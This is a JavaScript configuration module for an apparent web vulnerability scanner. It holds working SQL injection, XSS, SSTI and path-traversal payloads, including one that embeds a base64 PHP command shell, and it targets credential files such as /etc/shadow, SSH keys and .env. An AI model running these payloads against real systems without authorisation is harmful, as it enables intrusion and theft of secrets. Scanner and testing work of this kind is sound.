'use strict';

/**
 * Centralized payload configurations — all security test modules
 */

const PAYLOADS = {

  // ─── SQL Injection ────────────────────────────────────────────────────────
  sqli: {
    params: ['id', 'user', 'q', 'search', 'item', 'email', 'name', 'page', 'cat', 'product',
             'uid', 'pid', 'category', 'order', 'sort', 'filter', 'ref', 'code', 'num', 'view'],

    // Boolean-based blind : paire vrai/faux. Si la réponse "vrai" ressemble à la
    // baseline et que la réponse "faux" en diverge nettement → injection probable.
    boolean_pairs: [
      { t: "' AND '1'='1",  f: "' AND '1'='2"  },
      { t: "' AND 1=1-- -", f: "' AND 1=2-- -" },
      { t: " AND 1=1",      f: " AND 1=2"       },
      { t: "') AND ('1'='1",f: "') AND ('1'='2" },
      { t: '" AND "1"="1',  f: '" AND "1"="2'   },
    ],

    // Error-based payloads — trigger DB error messages
    error_payloads: [
      "' OR '1'='1",
      "' OR 1=1 --",
      "' OR 1=1 /*",
      "1' OR '1'='1",
      "' UNION SELECT NULL --",
      "' UNION SELECT 1,2,3 --",
      "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
      "admin'--",
      "1 OR 1=1",
      "' OR 'a'='a",
      // Boolean-based
      "' AND 1=1--",
      "' AND 1=2--",
      "1' AND '1'='1",
      "' OR 'x'='x",
      // UNION-based enumeration
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT 1,@@version,3--",
      "' UNION SELECT table_name,NULL FROM information_schema.tables--",
      "' GROUP BY 1--",
      // Error extraction
      "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
      "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
      // Auth bypass
      "admin' #",
      "' OR 1=1 LIMIT 1 #",
      "1' OR '1'='1' /*",
    ],

    // Time-based blind payloads — { payload, delay } in ms
    time_payloads: [
      { payload: "' AND SLEEP(5)-- -",                                        delay: 4800, db: 'MySQL'      },
      { payload: "1; WAITFOR DELAY '0:0:5'--",                                delay: 4800, db: 'MSSQL'     },
      { payload: "'; SELECT pg_sleep(5)--",                                    delay: 4800, db: 'PostgreSQL' },
      { payload: "' OR SLEEP(5)-- -",                                          delay: 4800, db: 'MySQL'      },
      { payload: "1 AND 1=1 AND SLEEP(5)",                                     delay: 4800, db: 'MySQL'      },
      { payload: "1'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),5) FROM DUAL--",  delay: 4800, db: 'Oracle'     },
      { payload: "1' OR SLEEP(5) #",                                           delay: 4800, db: 'MySQL'      },
      { payload: "'; SELECT SLEEP(5)--",                                       delay: 4800, db: 'MySQL'      },
    ],

    // Patterns indicating DB errors in response
    errorPatterns: [
      /SQL syntax.*MySQL|MySQL.*SQL syntax/i,
      /mysql_fetch_array|mysql_num_rows|mysql_result/i,
      /ORA-\d{5}:/i,
      /PostgreSQL.*ERROR|ERROR.*PostgreSQL/i,
      /Microsoft SQL Server|ODBC Driver.*SQL Server/i,
      /SQLite3::query|sqlite3_exec|SQLite Exception/i,
      /syntax error.*FROM|unclosed quotation mark/i,
      /DB2 SQL error|SQLCODE=/i,
      /Incorrect syntax near/i,
      /Unclosed quotation mark after the character string/i,
      /Warning.*\Wmysqli?_/i,
      /Sybase message|Warning.*Sybase/i,
      /Informix ODBC Driver|ODBC Informix/i,
      /JDBC Driver.*SQL|SQL.*JDBC Driver/i,
      /you have an error in your SQL syntax/i,
      /quoted string not properly terminated/i,
    ],
  },

  // ─── XSS ─────────────────────────────────────────────────────────────────
  xss: {
    params: ['q', 's', 'search', 'name', 'msg', 'cmd', 'user', 'comment', 'feedback', 'text', 'query', 'keyword', 'term', 'data'],
    payloads: [
      '<netguard>alert(1)</netguard>',
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '"><script>alert(1)</script>',
      "'><img src=x onerror=alert(1)>",
      '<details open ontoggle=alert(1)>',
      '<iframe srcdoc="<script>alert(1)</script>">',
      // HTML5 events
      '<marquee onstart=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<object data="javascript:alert(1)">',
      // Attribute injection
      '" onmouseover="alert(1)',
      "' onmouseover='alert(1)",
      // Encoding bypass
      '<scr\x00ipt>alert(1)</scr\x00ipt>',
      '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
      // MathML
      '<math><mtext></math><img src=x onerror=alert(1)>',
      // Template literal
      '${alert(1)}',
      // DOM sink bait
      'javascript:alert(document.domain)',
      // Polyglot (s'exécute dans plusieurs contextes : attribut, JS, HTML)
      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>',
      // Contexte JS (bris de chaîne)
      '\';alert(1);//',
      '\\\';alert(1);//',
      // SVG + animate
      '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
      // Balise fermante générique
      '</title><script>alert(1)</script>',
    ],
  },

  // ─── Secrets exposés (clés API, tokens, clés privées dans le HTML/JS) ───────
  secrets: {
    patterns: [
      { rx: /AKIA[0-9A-Z]{16}/,                                  name: 'AWS Access Key ID',    sev: 'CRITICAL' },
      { rx: /AIza[0-9A-Za-z\-_]{35}/,                            name: 'Google API Key',       sev: 'HIGH'     },
      { rx: /sk_live_[0-9a-zA-Z]{20,}/,                          name: 'Stripe Secret Key',    sev: 'CRITICAL' },
      { rx: /gh[pousr]_[0-9A-Za-z]{36,}/,                        name: 'GitHub Token',         sev: 'CRITICAL' },
      { rx: /xox[baprs]-[0-9A-Za-z-]{10,48}/,                    name: 'Slack Token',          sev: 'HIGH'     },
      { rx: /-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/, name: 'Clé privée',       sev: 'CRITICAL' },
      { rx: /mongodb(?:\+srv)?:\/\/[^\s"'<>]+:[^\s"'<>]+@/,      name: 'URI MongoDB (avec mdp)', sev: 'CRITICAL' },
      { rx: /postgres(?:ql)?:\/\/[^\s"'<>]+:[^\s"'<>]+@/,        name: 'URI PostgreSQL (avec mdp)', sev: 'CRITICAL' },
      { rx: /(?:SG\.)[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}/,    name: 'SendGrid API Key',     sev: 'HIGH'     },
      { rx: /ya29\.[0-9A-Za-z\-_]+/,                             name: 'Google OAuth Token',   sev: 'HIGH'     },
      { rx: /AC[a-z0-9]{32}/,                                    name: 'Twilio Account SID',   sev: 'MEDIUM'   },
      { rx: /FIREBASE[_A-Z]*=[A-Za-z0-9\-_]{20,}/i,              name: 'Firebase Config Key',  sev: 'HIGH'     },
      { rx: /bearer[\s=]+[A-Za-z0-9._\-]{30,}/i,                 name: 'Bearer Token',         sev: 'HIGH'     },
      { rx: /api[_-]?key[\s=:]+[A-Za-z0-9._\-]{20,}/i,           name: 'API Key',              sev: 'HIGH'     },
      { rx: /password[\s=:]+[^\s"'<>]{8,}/i,                      name: 'Exposed Password',     sev: 'CRITICAL' },
      { rx: /AZURE_[A-Z0-9_]+=[A-Za-z0-9\-_.]+/i,                name: 'Azure Credential',     sev: 'HIGH'     },
    ],
  },

  // ─── Services mal configurés / Backdoors ──────────────────────────────────
  misconfig: {
    files: [
      { path: '/.env', label: '.env file', sev: 'CRITICAL' },
      { path: '/.env.local', label: '.env.local', sev: 'CRITICAL' },
      { path: '/.env.example', label: '.env.example (contains hints)', sev: 'MEDIUM' },
      { path: '/config.php', label: 'PHP config', sev: 'CRITICAL' },
      { path: '/config.js', label: 'JS config', sev: 'CRITICAL' },
      { path: '/settings.php', label: 'Settings file', sev: 'HIGH' },
      { path: '/web.config', label: 'IIS config', sev: 'HIGH' },
      { path: '/composer.json', label: 'Composer file (dependencies)', sev: 'MEDIUM' },
      { path: '/package.json', label: 'Package.json (npm deps)', sev: 'MEDIUM' },
      { path: '/requirements.txt', label: 'Python requirements', sev: 'MEDIUM' },
      { path: '/.git/config', label: 'Git config', sev: 'HIGH' },
      { path: '/.git/HEAD', label: 'Git metadata', sev: 'MEDIUM' },
      { path: '/backup.sql', label: 'Database backup', sev: 'CRITICAL' },
      { path: '/backup.tar', label: 'Backup archive', sev: 'CRITICAL' },
      { path: '/dump.sql', label: 'SQL dump', sev: 'CRITICAL' },
      { path: '/wp-config.php', label: 'WordPress config', sev: 'CRITICAL' },
      { path: '/database.yml', label: 'Rails database.yml', sev: 'CRITICAL' },
      { path: '/Makefile', label: 'Build Makefile', sev: 'MEDIUM' },
      { path: '/Dockerfile', label: 'Docker file (build hints)', sev: 'MEDIUM' },
      { path: '/docker-compose.yml', label: 'Docker Compose (credentials)', sev: 'HIGH' },
    ],
    admin_paths: [
      { path: '/admin', name: 'Admin panel' },
      { path: '/administrator', name: 'Admin (Joomla style)' },
      { path: '/wp-admin', name: 'WordPress admin' },
      { path: '/admin.php', name: 'Admin page' },
      { path: '/login.php', name: 'Login panel' },
      { path: '/control', name: 'Control panel' },
      { path: '/cms', name: 'CMS admin' },
      { path: '/manage', name: 'Management panel' },
      { path: '/dashboard', name: 'Dashboard' },
      { path: '/phpmyadmin', name: 'phpMyAdmin' },
      { path: '/pma', name: 'phpMyAdmin (short)' },
      { path: '/adminer.php', name: 'Adminer' },
    ],
    backdoor_paths: [
      { path: '/shell.php', pattern: /shell|command|exec|system|passthru/i },
      { path: '/shell.asp', pattern: /shell|command|exec|system/i },
      { path: '/cmd.php', pattern: /cmd|command|exec|system|passthru/i },
      { path: '/upload.php', pattern: /upload|file|move_uploaded|eval/i },
      { path: '/upload.asp', pattern: /upload|file|move_uploaded/i },
      { path: '/file.php', pattern: /file|read|write|include|require/i },
      { path: '/eval.php', pattern: /eval|preg_replace|create_function/i },
      { path: '/test.php', pattern: /phpinfo|system|shell|eval/i },
      { path: '/1.php', pattern: /shell|cmd|system|exec|eval/i },
      { path: '/wso.php', pattern: /wso|shell|file|edit/i },
    ],
    debug_indicators: [
      { rx: /debug\s*=\s*true/i, label: 'Debug mode enabled' },
      { rx: /app_debug\s*=\s*true/i, label: 'Laravel debug on' },
      { rx: /DEBUG\s*=\s*True/i, label: 'Django debug on' },
      { rx: /development_mode\s*=\s*1/i, label: 'Dev mode on' },
      { rx: /display_errors\s*=\s*on/i, label: 'PHP errors displayed' },
    ],
  },

  // ─── GraphQL ────────────────────────────────────────────────────────────────
  graphql: {
    endpoints: ['/graphql', '/api/graphql', '/v1/graphql', '/graphql/v1', '/query', '/gql', '/api/gql'],
    introspection: '{"query":"query{__schema{queryType{name} types{name kind}}}"}',
  },

  // ─── LFI ─────────────────────────────────────────────────────────────────
  lfi: {
    params: ['file', 'page', 'doc', 'view', 'path', 'include', 'load', 'template', 'lang', 'dir', 'module', 'conf', 'src'],
    paths: [
      '../../../../etc/passwd',
      '../../../etc/passwd',
      '../../etc/passwd',
      '../../../../etc/shadow',
      '../../../../etc/hosts',
      '../../../../proc/version',
      '../../../../windows/win.ini',
      '../../../../windows/system32/drivers/etc/hosts',
      '....//....//....//....//etc/passwd',
      '..\\..\\..\\..\\windows\\win.ini',
      'php://filter/convert.base64-encode/resource=/etc/passwd',
      'file:///etc/passwd',
      // Additional Linux paths
      '../../../../etc/os-release',
      '../../../../etc/issue',
      '../../../../usr/local/etc/nginx/nginx.conf',
      // Proc filesystem
      '../../../../proc/self/environ',
      '../../../../proc/self/cmdline',
      '../../../../proc/self/status',
      // Log files — for log poisoning chains
      '../../../../var/log/apache2/access.log',
      '../../../../var/log/apache/access.log',
      '../../../../var/log/nginx/access.log',
      '../../../../var/log/nginx/error.log',
      '../../../../var/log/auth.log',
      '../../../../var/log/syslog',
      // Windows system files
      '../../../../windows/system32/config/SAM',
      '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      // PHP wrappers
      'php://filter/read=convert.base64-encode/resource=index.php',
      'php://filter/read=convert.base64-encode/resource=../config.php',
      'php://input',
      'expect://id',
      'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+',
      // Null byte (legacy PHP < 5.3.4)
      '../../../../etc/passwd%00',
      '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
    ],
    // Strict indicators — no false positives
    strictIndicators: [
      /root:x:0:0:/,
      /daemon:x:\d+:\d+:/,
      /\[extensions\]\s*\r?\n.*\bphp\b/i,
      /for 16-bit app support/i,
      /\[Mail\]\s*\r?\n/,
      /\[fonts\]\s*\r?\n/i,
      /linux version \d+\.\d+/i,
      /ubuntu|debian|centos|fedora|alpine/i,
    ],
  },

  // ─── RCE ─────────────────────────────────────────────────────────────────
  rce: {
    params: ['cmd', 'exec', 'ping', 'query', 'ip', 'host', 'command', 'system', 'run', 'shell'],
  },

  // ─── SSTI ─────────────────────────────────────────────────────────────────
  ssti: {
    params: ['name', 'user', 'q', 'search', 'email', 'template', 'msg', 'lang', 'title', 'subject', 'body'],
    // {A} et {B} sont remplacés par des nombres aléatoires à chaque scan : le
    // produit est unique et improbable dans une page réelle → anti-faux-positif
    // (fini le "49" qui traînait déjà dans la page).
    templates: [
      { tpl: '{{A*B}}',             engine: 'Jinja2/Twig'     },
      { tpl: '${A*B}',              engine: 'Mako/Freemarker' },
      { tpl: '<%= A*B %>',          engine: 'ERB/EJS'         },
      { tpl: '#{A*B}',              engine: 'Ruby'            },
      { tpl: '*{A*B}',              engine: 'Spring SpEL'     },
      { tpl: '{A*B}',               engine: 'Smarty'          },
      { tpl: '#set($x=A*B)$x',      engine: 'Velocity'        },
      { tpl: '[[${A*B}]]',          engine: 'Thymeleaf'       },
      { tpl: '{{= A*B }}',          engine: 'Handlebars'      },
      { tpl: '<#assign x=A*B>${x}', engine: 'Freemarker'      },
    ],
  },

  // ─── Open Redirect ────────────────────────────────────────────────────────
  openRedirect: {
    params: [
      'url', 'next', 'target', 'dest', 'redirect', 'return_to', 'r', 'u', 'goto', 'return', 'continue',
      'returnUrl', 'forward', 'redir', 'redirectUrl', 'ref', 'referer', 'referral',
      'path', 'callback', 'next_url', 'redirect_to', 'back', 'location',
    ],
    marker: 'evil.netguard.test',
  },

  // ─── CORS ─────────────────────────────────────────────────────────────────
  cors: {
    testOrigin: 'https://evil.netguard.test',
  },

  // ─── Sensitive Files ──────────────────────────────────────────────────────
  sensitiveFiles: [
    '/.env',
    '/.env.local',
    '/.env.production',
    '/.env.backup',
    '/.env.example',
    '/.env.dev',
    '/.env.staging',
    '/.git/config',
    '/.git/HEAD',
    '/.git/COMMIT_EDITMSG',
    '/.DS_Store',
    '/robots.txt',
    '/sitemap.xml',
    '/package.json',
    '/package-lock.json',
    '/composer.json',
    '/composer.lock',
    '/server-status',
    '/server-info',
    '/phpinfo.php',
    '/info.php',
    '/backup.sql',
    '/database.sql',
    '/db.sql',
    '/dump.sql',
    '/debug.log',
    '/error.log',
    '/.htaccess',
    '/.htpasswd',
    '/web.config',
    '/config.php',
    '/config.yml',
    '/config.yaml',
    '/wp-config.php',
    '/wp-config.php.bak',
    '/wp-login.php',
    '/admin/config.php',
    '/.ssh/id_rsa',
    '/id_rsa',
    '/Dockerfile',
    '/docker-compose.yml',
    '/docker-compose.yaml',
    '/nginx.conf',
    '/apache.conf',
    '/sftp-config.json',
    // API documentation — schema disclosure
    '/swagger.json',
    '/swagger.yaml',
    '/openapi.json',
    '/openapi.yaml',
    '/api/swagger.json',
    '/api/openapi.json',
    '/v1/swagger.json',
    '/v2/api-docs',
    '/api-docs',
    // CI/CD & build
    '/.travis.yml',
    '/Jenkinsfile',
    '/Makefile',
    '/.circleci/config.yml',
    // Framework-specific config
    '/application.properties',
    '/application.yml',
    '/config/database.yml',
    '/config/secrets.yml',
    '/settings.py',
    '/local_settings.py',
    '/configuration.php',
    '/config.js',
    // Shell & credential history
    '/.bash_history',
    '/.mysql_history',
    '/credentials.json',
    '/secrets.json',
    // Extra dumps
    '/data.sql',
    // Security policy
    '/.well-known/security.txt',
  ],

  // ─── HTTP Methods ─────────────────────────────────────────────────────────
  httpMethods: {
    dangerous: [
      { method: 'TRACE',    risk: 'XST — récupération de cookies HttpOnly'                },
      { method: 'PUT',      risk: 'Upload de fichiers arbitraires → RCE'                  },
      { method: 'DELETE',   risk: 'Suppression de ressources'                             },
      { method: 'PATCH',    risk: 'Modification partielle non autorisée de ressources'    },
      { method: 'OPTIONS',  risk: 'Révèle les méthodes autorisées (info disclosure)'      },
      { method: 'PROPFIND', risk: 'WebDAV — énumération de la structure du serveur'       },
    ],
  },

  // ─── Flag patterns (CTF) ─────────────────────────────────────────────────
  flagPatterns: [
    /HTB\{[^}]+\}/gi,
    /flag\{[^}]+\}/gi,
    /NETGUARD\{[^}]+\}/gi,
    /FLAG\{[^}]+\}/gi,
    /CTF\{[^}]+\}/gi,
  ],
};

module.exports = { PAYLOADS };
